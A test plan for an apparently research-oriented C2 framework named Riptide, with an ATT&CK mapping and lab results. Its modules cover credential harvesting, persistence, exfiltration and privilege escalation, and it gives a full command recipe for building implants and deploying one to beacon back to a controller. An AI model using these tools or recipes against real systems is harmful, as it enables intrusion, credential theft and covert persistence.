# Riptide — Test Plan

Comprehensive test plan for the Riptide C2 framework, with ATT&CK TTP mapping.
Statuses marked **PASS** were executed end-to-end against the lab on
2026-07-24 (see "Test Environment"). Items marked **DEFERRED** require a
human operator or destructive conditions and are called out explicitly.

---

## 1. ATT&CK TTP Mapping

Each module/action maps to one or more MITRE ATT&CK techniques. This is the
"back of the mind" alignment the framework is being steered toward — the same
objective is achievable via multiple tradecraft levels (loud vs stealthy) so
different agent profiles generate distinguishable traces.

| Module    | Action      | ATT&CK technique(s)                 | Tradecraft level        |
|-----------|-------------|-------------------------------------|-------------------------|
| shell     | exec        | T1059.004 (Unix Shell)              | loud (subprocess)       |
| recon     | passive     | T1046 (Network Service Discovery), T1082 (System Info) | stealth (in-memory /proc) |
| recon     | active      | T1046, T1018 (Remote System Discovery) | loud (ping sweep, ss, ip) |
| recon     | arp         | T1018, T1046                        | stealth (/proc/net/arp) |
| discovery | procs       | T1057 (Process Discovery)           | stealth (in-memory /proc) |
| discovery | users       | T1087.001 (Local Account), T1069 (Groups) | stealth (in-memory /etc) |
| discovery | suid        | T1083 (File & Directory Discovery)  | loud (shell `find`)     |
| discovery | services    | T1007 (System Service Discovery), T1053 (Scheduled Task) | loud (systemctl + cron) |
| creds     | harvest (in_memory) | T1003.008 (/etc/shadow), T1552.004 (SSH keys), T1555.003 (Firefox) | stealth |
| creds     | harvest (shell)     | T1003.008, T1552.001, T1552.004     | loud (cp/find)          |
| privesc   | copyfail    | T1068 (Exploitation for Privilege Escalation), CVE-2026-31431 | stealth (kernel exploit) |
| privesc   | pkexec      | T1548.005 (Setuid via PolicyKit), T1548 | loud (GUI password prompt) |
| persist   | cron        | T1053.003 (Cron)                    | mixed                   |
| persist   | systemd     | T1543.002 (Systemd Service)         | stealth                 |
| persist   | bashrc      | T1546.004 (Unix Shell Config)       | loud                    |
| exfil     | file        | T1041 (Exfiltration Over C2)        | loud (chunked POST) / stealth |
| exfil     | dir         | T1041, T1560 (Archive Collected Data) | mixed                 |
| file      | read        | T1005 (Data from Local System), T1083 | mixed                 |
| file      | write       | T1105 (Ingress Tool Transfer), T1027 | mixed                 |
| marker    | write       | (framework labelling — attribution) | n/a                     |
| system    | info        | T1082 (System Info)                 | n/a                     |
| system    | sleep       | T1027 (obfuscation of cadence)      | n/a                     |
| system    | exit        | T1070.004 (fileless cleanup signal) | n/a                     |

### Operator-presence profiles (compile-time, `payload-gen --mode`)

| Profile     | Cadence                          | Detection signal              | ATT&CK |
|-------------|----------------------------------|-------------------------------|--------|
| interactive | ~1s polling, no jitter (default) | chatty, constant check-ins    | T1071.001 (Web protocols), high beacon rate |
| beacon      | interval + jitter (low-and-slow) | sparse, blended traffic       | T1071.001, low-and-slow |

---

## 2. Test Environment

- **Build/host**: this machine, Rust 1.96, `x86_64-unknown-linux-musl` target.
- **C2 server**: runs on the host, API on `0.0.0.0:10337`, dynamic HTTP beacon
  listener on `18080`. Logs/loot/cert under the job tmp dir.
- **Victim**: incus VM `test-red-teaming` (Ubuntu 22.04, IP `10.216.236.5`),
  implant runs as the `ubuntu` user (uid 1000, in `sudo` group).
- **Reachability**: VM → host `10.216.236.1:18080` (beacon) and `:10337` (API)
  verified via curl. VM ↔ `riptide` container `10.216.236.207` verified.
- **Helper**: `cq.sh <session> <module> <action> [args_json]` queues a command
  via the REST API and polls for the result.

Build/run recipe (host):
```bash
cargo build -p c2-server --release && cargo build -p payload-gen --release
# start server (background), then start a beacon listener:
curl -X POST http://127.0.0.1:10337/api/v1/listeners -d '{"port":18080,"protocol":"http"}'
# generate implants:
RIPTIDE_SRC=$PWD ./target/release/payload-gen --protocol http --host 10.216.236.1 \
  --port 18080 --mode interactive --output ./implant-interactive.bin
RIPTIDE_SRC=$PWD ./target/release/payload-gen --protocol http --host 10.216.236.1 \
  --port 18080 --mode beacon --beacon-rate 4 --output ./implant-beacon.bin
# deploy to victim VM:
incus file push ./implant-interactive.bin test-red-teaming/tmp/implant.bin --mode 0755
timeout 6 incus exec test-red-teaming -- sudo -u ubuntu sh -c \
  'setsid /tmp/implant.bin </dev/null >/tmp/implant.log 2>&1 & echo $!'
```
> Note: `incus exec ... &` holds the channel open; wrap in `timeout` and use
> `setsid </dev/null` so the implant detaches and survives the channel close.

---

## 3. Test Results

### 3.1 Operator-presence profiles

| # | Test | Expected | Result |
|---|------|----------|--------|
| P1 | Interactive implant polls ~1s | 6 beacons / 6s | **PASS** — 6 beacons in 6s |
| P2 | Beacon implant polls on interval (4s) | ~1 beacon / 4s | **PASS** — beacon_count climbed ~1/4s |
| P3 | `system info` reports `mode` field | `interactive` / `beacon` | **PASS** — both verified |
| P4 | Interactive ignores `beacon_rate` | poll stays ~1s regardless | **PASS** (beacon_interval=60 reported but ignored) |
| P5 | Beacon honors `stay_alive` fast-poll; interactive skips it | no 10s slowdown in interactive | **PASS** (by code review + cadence) |

### 3.2 Command dispatch (modules)

| # | Module/action | Expected | Result |
|---|---------------|----------|--------|
| M1 | shell exec `id;whoami;hostname` | stdout uid=1000(ubuntu) | **PASS** |
| M2 | recon passive | /proc net dump (arp/tcp/udp/fib/ifaces) | **PASS** — showed implant's own C2 conn |
| M3 | recon arp | ARP table | **PASS** |
| M4 | discovery procs | pid map incl. implant | **PASS** — 297 procs, found disguised implant |
| M5 | discovery users | passwd/groups/homes | **PASS** — 51 users, 76 groups |
| M6 | discovery suid | SUID/SGID list via `find` | **PASS** — 27 binaries |
| M7 | discovery services | systemctl units + crontab | **PASS** — 266 units, 23 cron lines |
| M8 | creds harvest in_memory | sizes (0 on fresh VM as unpriv) | **PASS** — no crash, shadow_size 0 (unreadable) |
| M9 | file read /etc/hostname | hex of `ubuntu\n` | **PASS** — `7562756e74750a` |
| M10 | file write + readback | writes `hello riptide\n` | **PASS** — roundtrip verified |
| M11 | marker write (label) | /dev/shm/ras_marker.<ts> | **PASS** — file + `marker:label:pid:ts` |
| M12 | exfil file /etc/hostname | loot file grows by name+data | **PASS** — loot 21 B = `name\n`+data |
| M13 | system info | tier/mode/uid/pid/os/c2 | **PASS** |
| M14 | system sleep 0 | no-op, no hot loop | **PASS** — 1 beacon/6s (regression fixed) |
| M15 | system sleep 8 → sleep 2 | interval changes | **PASS** — 0 then 3 beacons/6s |
| M16 | system exit | implant process exits | **PASS** — process gone after exit |
| M17 | persist bashrc (unpriv) | best-effort, reports written/failed | **PASS** — written [.bashrc], failed [/etc/bash.bashrc] |
| M18 | persist cron (unpriv) | graceful failure (needs root) | **PASS** — status failed, no crash |

### 3.3 Privilege escalation

| # | Test | Expected | Result |
|---|------|----------|--------|
| E1 | privesc pkexec code path | re-exec self as root, same implant_id, parent exits | **PASS** (code review + compile) — `reexec:true` flag set, lib.rs exits parent |
| E2 | privesc pkexec live (GUI) | session uid 0→root, single session | **DEFERRED** — needs human at GUI; see §5 |
| E3 | privesc copyfail | corrupt /usr/bin/su, exec as root | **DEFERRED** — kernel-version/CVE specific; not exercised live |

### 3.4 Server API (operator-facing)

| # | Endpoint | Expected | Result |
|---|----------|----------|--------|
| S1 | GET /health | `ok` | **PASS** |
| S2 | POST /api/v1/listeners | starts beacon listener | **PASS** — 18080 http active |
| S3 | GET /api/v1/listeners | lists listener | **PASS** |
| S4 | POST /api/v1/sessions/:id/commands | returns command_id | **PASS** |
| S5 | GET /api/v1/sessions/:id/commands/:cid | status + result when done | **PASS** |
| S6 | DELETE /api/v1/sessions/:id | removes session | **PASS** (probe session) |
| S7 | POST /beacon (implant) | registers/updates session, returns commands | **PASS** |
| S8 | POST /result (implant) | stores result in history | **PASS** |
| S9 | POST /upload (exfil) | appends to loot file | **PASS** |
| S10 | DELETE /api/v1/listeners/:port | stops listener | (not exercised — leave listener up) |

### 3.5 Build matrix

| # | Build | Expected | Result |
|---|-------|----------|--------|
| B1 | `cargo check --workspace` | clean | **PASS** (2 pre-existing warnings: unused `crate::c2` import, unused `config` in cmd_persist_systemd) |
| B2 | `cargo build -p c2-server --release` | host binary | **PASS** |
| B3 | `cargo build -p payload-gen --release` | host binary | **PASS** |
| B4 | payload-gen `--mode interactive` (musl) | static binary | **PASS** — 3.3 MB |
| B5 | payload-gen `--mode beacon` (musl) | static binary | **PASS** — 3.3 MB |
| B6 | payload-gen `--mode badvalue` | exit 1 | **PASS** (validation) |
| B7 | payload-gen invalid `--protocol` | exit 1 | **PASS** (validation) |

### 3.6 Console TUI

| # | Test | Expected | Result |
|---|------|----------|--------|
| C1 | `cargo check -p console` | compiles with discovery mapping | **PASS** |
| C2 | console `discovery`/`enum` command | queues discovery module | **PASS** (by code path; TUI not driven live) |
| C3 | console help lists discovery | help text updated | **PASS** |

---

## 4. Regression tests (must not break)

| # | Regression | Guard |
|---|-----------|-------|
| R1 | `system sleep 0` must NOT hot-loop the server | `secs > 0` floor in `run_beacon_loop` (restored) |
| R2 | pkexec must NOT spawn a second session | parent exits on `reexec:true`; root child reuses implant_id |
| R3 | persist bashrc must report partial success, not abort on first denial | best-effort loop + per-file `written`/`failed` |
| R4 | mode is compile-time; beacon_rate ignored in interactive | `IMPLANT_MODE` env, `INTERACTIVE_POLL_SECS` const |

---

## 5. Deferred / human-required

### pkexec live escalation (E2)
`privesc pkexec` opens a PolicyKit **GUI** password prompt on the target's
desktop. It cannot be exercised headlessly. To test when an operator is
available:

1. Ensure the victim VM has an active graphical/polkit session (or run a polkit
   agent: `/usr/lib/policykit-1-gnome/polkit-gnome-authentication-agent-1 &`).
2. Launch an interactive implant as `ubuntu` (see §2 recipe).
3. Queue: `cq.sh <session> privesc pkexec {}`.
4. Approve the GUI prompt (enter ubuntu password or have admin authorize).
5. **Expected**: the unprivileged implant exits; a root instance beacons under
   the **same** session id; `GET /api/v1/sessions/:id` shows `uid: 0`,
   `privileges: root`. Only ONE session exists (no duplicate).
6. If pkexec is cancelled/unavailable, the implant reports failure and the
   unprivileged process keeps beaconing (no escalation, no exit).

### copyfail live escalation (E3)
Kernel-version- and CVE-2026-31431-specific (AF_ALG page-cache corruption of
`/usr/bin/su`). Exercising it requires a vulnerable kernel and risks system
instability. Left to a controlled, snapshot-able target.

---

## 6. Known issues / follow-ups

- **README is stale.** It advertises `--http-port`/`--https-port` with
  "HTTP :80 / HTTPS :443 at startup". Real CLI is `--api-port` (default 10337)
  with dynamic beacon listeners via API/console. README quick-start and several
  port examples are wrong. (Out of scope to fix here.)
- **`c2-server/src/main.rs` header comment** says default api-port 10000; the
  `#[arg]` default is 10337.
- **payload-gen final banner** prints `Operator console: --server http://<beacon-host>:<beacon-port>` — but the console needs the **API** port (10337), not
  the beacon listener port. Cosmetic but misleading.
- `download_file` / `update_config` handlers exist but are not registered on any
  router (dead-code-allowed).
- Two pre-existing compiler warnings in `implant` (unused `crate::c2` import;
  unused `config` param in `cmd_persist_systemd`) — harmless.
